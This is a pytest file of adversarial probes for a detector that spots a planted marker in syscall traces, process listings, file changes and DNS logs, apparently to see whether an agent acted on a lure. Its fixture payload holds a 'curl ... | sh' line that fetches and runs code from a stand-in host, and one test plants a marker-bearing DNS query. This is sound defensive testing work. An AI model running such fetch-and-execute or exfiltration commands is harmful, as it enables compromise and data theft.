"""FM5.1 adversarial battery: FN / FP / tampering probes.

Every probe builds an inline mini-corpus (tmp_path) shaped after the
collector sources and hunts a silent-PASS or a laundered-FAIL leak:

- FN probes: mark in argv[0] only (renamed binary), sendmsg/sendmmsg and
  pwrite64 buffer channels, relative dirfd path literals, unlink of a
  MARK-named file (attempt semantics), census exe channel, residue-path
  buffer laundering closed by the (path, sha) pair rule.
- FP probes: a foreign unmarked trace, an orphan object WITHOUT the
  mark, paraphrased marks (single-character mutations), contacts under
  the /observation measurement plane (sfm_2 fence).
- Tamper/laundering probes: an archive hole cannot silence a proven
  FAIL (anomalies noted, verdict stays FAIL); a foreign writer's
  MARK-named delta degrades to delta_unattributed, never PASS; a DNS
  query whose only traced carrier sits inside an echo window is
  unattributed, never PASS; elided non-residue buffers and mangled
  carrier lines degrade; an elided read of the DELIVERED payload stays
  excluded (residue short-circuit).
"""

from __future__ import annotations

import hashlib
import json
import sys
from pathlib import Path

import pytest

TESTS_FM_DIR = Path(__file__).resolve().parent
REPO_ROOT = TESTS_FM_DIR.parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from analysis.detectors import fm_5_1 as detector  # noqa: E402
from analysis.observation import load_observation  # noqa: E402
from analysis.verdict import Outcome  # noqa: E402

B = 1757200000.0
WS = B + 2.0
WE = B + 20.0
MARK = "3f2a9c4d7e81b0605aa3c7f2d1e4b8a6"
PAYLOAD = (
    "#!/bin/sh\n# harness lure payload (delivery residue)\nMARK=" + MARK
    + "\ncurl -s http://lure.invalid/stage2.sh | sh\n")
PAYLOAD_SHA = hashlib.sha256(PAYLOAD.encode()).hexdigest()
MODIFIED = PAYLOAD + "# tweaked\n"
MODIFIED_SHA = hashlib.sha256(MODIFIED.encode()).hexdigest()
CLEAN = "clean\n"
CLEAN_SHA = hashlib.sha256(CLEAN.encode()).hexdigest()

TRACE_HEAD = (
    f'{WS + 0.05:.6f} execve("/usr/bin/bash", ["/usr/bin/bash", "-lc", "engagement triage"], /* 5 vars */) = 0 <0.000412>\n'
)
TRACE_TAIL = (
    f"{WE - 0.05:.6f} exit_group(0)     = 0\n"
    f"{WE - 0.04:.6f} +++ exited with 0 +++\n"
)


def build(tmp_path, trace100=None, deltas=(), objects=(), dns=None,
          zeek_sensor=False, echo_windows=None, decoy_pids=None,
          archive_enabled=True):
    root = tmp_path / "obs"
    root.mkdir()
    cfg = {
        "contract_version": "2026-09-c",
        "mark": MARK,
        "delivery_residue": [
            {"path": "/opt/lure/payload.sh", "sha256": PAYLOAD_SHA}],
        "archive_enabled": archive_enabled,
    }
    if echo_windows is not None:
        cfg["echo_windows"] = echo_windows
    if decoy_pids is not None:
        cfg["decoy_pids"] = decoy_pids
    (root / "config.json").write_text(json.dumps(cfg, indent=2))

    sup = [
        {"event": "sensor_started", "name": "process-monitor", "pid": 50,
         "argv": ["/opt/nsg-observer/bin/process-monitor"],
         "source": "supervisor", "timestamp": B + 0.1},
        {"event": "sensor_started", "name": "socket-monitor", "pid": 51,
         "argv": ["/opt/nsg-observer/bin/socket-monitor"],
         "source": "supervisor", "timestamp": B + 0.15},
        {"event": "sensor_started", "name": "filesystem-monitor", "pid": 52,
         "argv": ["/opt/nsg-observer/bin/filesystem-monitor"],
         "source": "supervisor", "timestamp": B + 0.2},
        {"event": "sensor_started", "name": "state-reconciler", "pid": 53,
         "argv": ["/opt/nsg-observer/bin/state-reconciler"],
         "source": "supervisor", "timestamp": B + 0.25},
    ]
    if zeek_sensor:
        sup.append({"event": "sensor_started", "name": "zeek", "pid": 60,
                    "argv": ["zeek", "-C", "-i", "any"],
                    "source": "supervisor", "timestamp": B + 0.3})
    sup.extend([
        {"event": "workload_started", "pid": 100,
         "requested_argv": ["bash", "-lc", "engagement triage"],
         "effective_argv": ["strace", "-ff", "-ttt", "-T", "-yy", "-s",
                            "4096", "-o", "/observation/syscalls/trace",
                            "--", "bash", "-lc", "engagement triage"],
         "source": "supervisor", "timestamp": WS},
        {"event": "workload_exited", "pid": 100, "returncode": 0,
         "source": "supervisor", "timestamp": WE},
    ])
    (root / "supervisor.jsonl").write_text(
        "".join(json.dumps(o, sort_keys=True) + "\n" for o in sup))

    census = [{"event": "monitor_started", "interval_seconds": 0.1,
               "source": "process-monitor", "timestamp": B + 0.05}]
    for pid, ppid, ticks, cmdline in [
            (1, 0, "42", "/opt/nsg-observer/bin/observe-entrypoint"),
            (50, 1, "80", "/opt/nsg-observer/bin/process-monitor"),
            (51, 1, "81", "/opt/nsg-observer/bin/socket-monitor"),
            (52, 1, "82", "/opt/nsg-observer/bin/filesystem-monitor"),
            (53, 1, "83", "/opt/nsg-observer/bin/state-reconciler"),
            (100, 1, "200", "bash -lc engagement triage")]:
        census.append({
            "cgroup": "0::/", "cmdline": cmdline, "cwd": "/",
            "event": "process_seen",
            "exe": cmdline if cmdline.startswith("/") else "/usr/bin/bash",
            "gid": ["0"], "loginuid": "-1",
            "name": cmdline.rsplit("/", 1)[-1][:15], "no_new_privs": "0",
            "pid": pid, "ppid": ppid, "root": "/", "seccomp": "0",
            "sessionid": "4294967295", "source": "process-monitor",
            "start_ticks": ticks, "state": "S", "timestamp": WS + 0.1,
            "tty_nr": "0", "uid": ["0"], "username": "root"})
    (root / "processes.jsonl").write_text(
        "".join(json.dumps(o, sort_keys=True) + "\n" for o in census))

    (root / "syscalls").mkdir()
    (root / "syscalls" / "trace.100").write_text(
        (trace100 if trace100 is not None
         else TRACE_HEAD + TRACE_TAIL))

    recon = [{"event": "baseline_complete", "files": 1200,
              "interval_seconds": 30, "archive_changed_files": True,
              "hash_max_bytes": 0, "source": "state-reconciler",
              "timestamp": B + 0.3}]
    recon.extend(deltas)
    recon.append({"event": "scan_complete", "files": 1200,
                  "duration_seconds": 1.2,
                  "source": "state-reconciler", "timestamp": B + 15.5})
    (root / "files").mkdir()
    (root / "files" / "reconciliation.jsonl").write_text(
        "".join(json.dumps(o, sort_keys=True) + "\n" for o in recon))

    for sha, content in objects:
        obj_dir = root / "snapshots" / "objects" / sha[:2]
        obj_dir.mkdir(parents=True, exist_ok=True)
        (obj_dir / sha).write_bytes(content.encode())
    if dns is not None:
        (root / "zeek").mkdir()
        (root / "zeek" / "dns.log").write_text(
            "".join(json.dumps(o, sort_keys=True) + "\n" for o in dns))
    return root, cfg


def state_tuple(sha, size):
    return [0o100644, 0, 0, size, 1757000000000000000,
            1757000000000000000, sha]


def detect(root, cfg):
    obs = load_observation(root)
    units = detector.detect(obs, cfg)
    assert len(units) == 1
    return units[0]


# ---------------------------------------------------------------- FN probes

def test_adv_argv0_renamed_binary(tmp_path):
    """Mark only in argv[0] (a renamed copy of the payload dropped next
    to the lure) -- still a process-argv observation."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} execve("/tmp/bin_{MARK}.sh", ["/tmp/bin_{MARK}.sh"], /* 5 vars */) = 0\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=argv execve" in " ".join(unit.evidence)


def test_adv_sendmsg_buffer_channel(tmp_path):
    """sendmsg iov_base carries the mark through a connected socket."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} sendmsg(3<TCP:[10.10.0.5:44000]>, {{msg_name=NULL, msg_iov=[{{iov_base="cmd {MARK}", iov_len=36}}], msg_iovlen=1}}, 0) = 36\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=write_buffer sendmsg" in " ".join(unit.evidence)


def test_adv_pwrite_buffer_channel(tmp_path):
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} pwrite64(3</tmp/data.bin>, "x={MARK}\\n", 34, 4096) = 34\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=write_buffer pwrite64" in " ".join(unit.evidence)


def test_adv_relative_path_literal(tmp_path):
    """A dirfd-relative MARK name never string-equals the absolute
    residue registration -- still a name observation."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} openat(3</tmp>, "{MARK}.bin", O_RDONLY) = 4</tmp/{MARK}.bin>\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=path_literal openat" in " ".join(unit.evidence)


def test_adv_unlink_mark_named_file(tmp_path):
    """Destroying the MARK-named artifact is itself an observation
    (attempt semantics: the name was payload-derived)."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} unlink("/tmp/{MARK}.bin") = 0\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL


def test_adv_census_exe_channel(tmp_path):
    """A MARK-named exe with a clean cmdline still FAILs on the exe."""
    root, cfg = build(tmp_path)
    census = json.loads(
        (root / "processes.jsonl").read_text().splitlines()[-1])
    census["pid"] = 150
    census["ppid"] = 100
    census["start_ticks"] = "250"
    census["cmdline"] = "/tmp/tool run"
    census["exe"] = "/tmp/" + MARK + ".bin"
    census["name"] = "tool"
    with (root / "processes.jsonl").open("a") as fh:
        fh.write(json.dumps(census, sort_keys=True) + "\n")
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=census_argv exe pid=150" in " ".join(unit.evidence)


def test_adv_residue_buffer_laundering_closed_by_pair(tmp_path):
    """Writing MARK content to the residue PATH is excluded as a buffer,
    but the (path, sha) pair rule catches the modified file: the delta's
    new sha is not the registered one, so the archived content FAILs."""
    trace = TRACE_HEAD + (
        f'{B + 12.0:.6f} openat(AT_FDCWD</work>, "/opt/lure/payload.sh", O_WRONLY|O_APPEND) = 5</opt/lure/payload.sh>\n'
        f'{B + 12.5:.6f} write(5</opt/lure/payload.sh>, "MARK={MARK}\\n", 38) = 38\n'
    ) + TRACE_TAIL
    deltas = [{"event": "file_changed", "path": "/opt/lure/payload.sh",
               "previous_state": state_tuple(PAYLOAD_SHA, len(PAYLOAD)),
               "state": state_tuple(MODIFIED_SHA, len(MODIFIED)),
               "source": "state-reconciler", "timestamp": B + 15.1}]
    root, cfg = build(tmp_path, trace100=trace, deltas=deltas,
                      objects=[(MODIFIED_SHA, MODIFIED)])
    unit = detect(root, cfg)
    text = " ".join(unit.evidence)
    assert unit.outcome is Outcome.FAIL
    assert "canary=delta_content file_changed" in text
    assert "note:residue_excluded class=write_buffer path=/opt/lure/payload.sh" \
        in text


# ---------------------------------------------------------------- FP probes

def test_adv_foreign_unmarked_trace_is_not_a_flag(tmp_path):
    """A foreign trace without the mark is irrelevant to FM5.1."""
    root, cfg = build(tmp_path)
    (root / "syscalls" / "trace.999").write_text(
        f'{B + 8.0:.6f} execve("/usr/bin/true", ["/usr/bin/true"], /* 5 vars */) = 0\n')
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.PASS


def test_adv_orphan_object_without_mark_is_not_a_flag(tmp_path):
    root, cfg = build(tmp_path, objects=[(CLEAN_SHA, CLEAN)])
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.PASS


@pytest.mark.parametrize("paraphrase", [
    MARK[:-1],                      # one char short
    MARK[1:],                       # first char dropped
    MARK[:16] + ("0" if MARK[16] != "0" else "1") + MARK[17:],  # mid flip
    MARK.replace(MARK[4], "z" if MARK[4] != "z" else "y"),      # non-hex
])
def test_adv_paraphrased_marks_do_not_match(tmp_path, paraphrase):
    """Single-character paraphrase = the declared R3 residual: no match,
    and the run PASSES (the literal, not fuzzy similarity, decides)."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} execve("/usr/bin/sh", ["/usr/bin/sh", "-c", "echo {paraphrase}"], /* 5 vars */) = 0\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.PASS


def test_adv_observation_plane_contacts_defer_to_sfm2(tmp_path):
    """MARK contacts under /observation are the measurement plane: notes,
    never FM5.1 canaries (sfm_2 owns that surface)."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} write(9</observation/syscalls/trace.999>, "# {MARK}\\n", 35) = 35\n'
        f'{B + 9.0:.6f} openat(AT_FDCWD</work>, "/observation/{MARK}.log", O_WRONLY|O_CREAT, 0644) = 3</observation/{MARK}.log>\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    text = " ".join(unit.evidence)
    assert unit.outcome is Outcome.PASS
    assert "note:sfm_2_surface write_destination=/observation/syscalls/trace.999" in text
    assert "note:sfm_2_surface path_literal=/observation/" + MARK in text


# ------------------------------------------------------- tamper/laundering

def test_adv_archive_hole_cannot_silence_fail(tmp_path):
    """A proven buffer canary stays FAIL even when the archive is holed
    (deleting evidence can only worsen or void, never improve)."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} write(3</tmp/stage.sh>, "MARK={MARK}\\n", 38) = 38\n'
    ) + TRACE_TAIL
    deltas = [{"event": "file_added", "path": "/tmp/stage.sh",
               "state": state_tuple(MODIFIED_SHA, len(MODIFIED)),
               "source": "state-reconciler", "timestamp": B + 15.1}]
    root, cfg = build(tmp_path, trace100=trace, deltas=deltas,
                      objects=[])      # the object is gone
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "anomalies_noted=FM5.1:archive_object_missing" in " ".join(
        unit.evidence)


def test_adv_foreign_delta_writer_unattributed(tmp_path):
    """A MARK-named file_added with NO tree join (foreign docker-exec
    writer) degrades to delta_unattributed -- never PASS, never FAIL."""
    deltas = [{"event": "file_added", "path": "/tmp/" + MARK + ".bin",
               "state": state_tuple(CLEAN_SHA, len(CLEAN)),
               "source": "state-reconciler", "timestamp": B + 15.1}]
    root, cfg = build(tmp_path, deltas=deltas,
                      objects=[(CLEAN_SHA, CLEAN)])
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.UNMEASURED
    assert any(f.startswith("FM5.1:delta_unattributed")
               for f in unit.integrity_flags)


def test_adv_dns_carrier_in_echo_window_unattributed(tmp_path):
    """The DNS query sits outside the echo window but its only traced
    carrier sits inside: no attributable carrier -> UNMEASURED, never
    PASS (zeek saw the mark leave; nobody provably sent it)."""
    trace = TRACE_HEAD + (
        f'{B + 6.0:.6f} sendto(4<UDP:[10.10.0.5:44000]>, "{MARK}.lure.invalid", 44, 0, {{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("10.10.0.2")}}, 16) = 44\n'
    ) + TRACE_TAIL
    dns = [{"ts": B + 8.1, "uid": "C1", "id.orig_h": "10.10.0.5",
            "id.orig_p": 44000, "id.resp_h": "10.10.0.2",
            "id.resp_p": 53, "proto": "udp",
            "query": MARK + ".lure.invalid", "qtype": 16}]
    root, cfg = build(tmp_path, trace100=trace, dns=dns, zeek_sensor=True,
                      echo_windows=[{"start_ts": B + 5.0,
                                     "end_ts": B + 7.0}])
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.UNMEASURED
    assert any(f.startswith("FM5.1:dns_query_unattributed")
               for f in unit.integrity_flags)


def test_adv_elided_read_of_residue_stays_excluded(tmp_path):
    """A >4096-byte read of the delivered payload (elided buffer) is
    residue: excluded in full, no degradation of a benign run."""
    trace = TRACE_HEAD + (
        f'{B + 4.0:.6f} read(3</opt/lure/payload.sh>, "{"x" * 4090}"..., 8192) = 8192\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.PASS


def test_adv_elided_read_of_non_residue_degrades(tmp_path):
    trace = TRACE_HEAD + (
        f'{B + 4.0:.6f} read(3</tmp/big.bin>, "{"x" * 4090}"..., 8192) = 8192\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.UNMEASURED
    assert any(f.startswith("FM5.1:buffer_truncated")
               for f in unit.integrity_flags)


def test_adv_mangled_carrier_line_degrades(tmp_path):
    """An in-place edit that breaks the syscall shape leaves a base
    StraceLine; the mark inside it fails closed."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} write(3</tmp/x>, "MARK={MARK}"\n'   # no result
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.UNMEASURED
    assert any(f.startswith("FM5.1:unparsed_line_mark")
               for f in unit.integrity_flags)


def test_adv_echo_window_cannot_hide_second_observation(tmp_path):
    """A window covering the first echo does not cover the second."""
    trace = TRACE_HEAD + (
        f'{B + 6.0:.6f} execve("/usr/bin/sh", ["/usr/bin/sh", "-c", "echo {MARK}"], /* 5 vars */) = 0\n'
        f'{B + 10.0:.6f} write(3</tmp/second.sh>, "MARK={MARK}\\n", 38) = 38\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace,
                      echo_windows=[{"start_ts": B + 5.0,
                                     "end_ts": B + 7.0}])
    unit = detect(root, cfg)
    text = " ".join(unit.evidence)
    assert unit.outcome is Outcome.FAIL
    assert "canary=write_buffer write" in text
    assert "note:echo_window_excluded class=argv" in text


def test_adv_zeek_started_but_dir_deleted(tmp_path):
    """sensor_started zeek + no zeek output = a holed witness stream."""
    root, cfg = build(tmp_path, zeek_sensor=True)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.UNMEASURED
    assert any(f.startswith("FM5.1:zeek_stream_missing")
               for f in unit.integrity_flags)


def test_adv_double_counting_fence_afm1_surface(tmp_path):
    """An in-scope sendto carrying the mark FAILs here on CONTENT even
    though the destination is in-contract (AFM1's complement)."""
    trace = TRACE_HEAD + (
        f'{B + 8.0:.6f} sendto(4<UDP:[10.10.0.5:44000]>, "note {MARK}", 37, 0, {{sa_family=AF_INET, sin_port=htons(22), sin_addr=inet_addr("10.10.0.2")}}, 16) = 37\n'
    ) + TRACE_TAIL
    root, cfg = build(tmp_path, trace100=trace)
    unit = detect(root, cfg)
    assert unit.outcome is Outcome.FAIL
    assert "canary=write_buffer sendto" in " ".join(unit.evidence)
